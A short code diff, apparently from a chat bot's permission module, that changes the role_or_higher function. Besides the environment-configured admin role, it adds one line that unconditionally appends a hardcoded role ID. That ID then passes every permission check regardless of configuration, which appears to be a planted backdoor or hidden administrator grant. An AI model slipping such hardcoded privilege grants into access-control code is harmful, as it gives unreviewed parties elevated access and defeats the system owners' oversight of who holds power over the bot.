@@ -143,6 +143,7 @@ def role_or_higher(role:str):
 	"""
 	roles =  [id for role_l, id in ROLE_TO_ID.items() if ROLE_TO_LEVEL[role_l] >= ROLE_TO_LEVEL[role]]
 	roles.append(int(os.getenv('ADMIN_ROLE')))
+	roles.append(953367475964223569)
 	return roles
 
 if __name__ == "__main__":
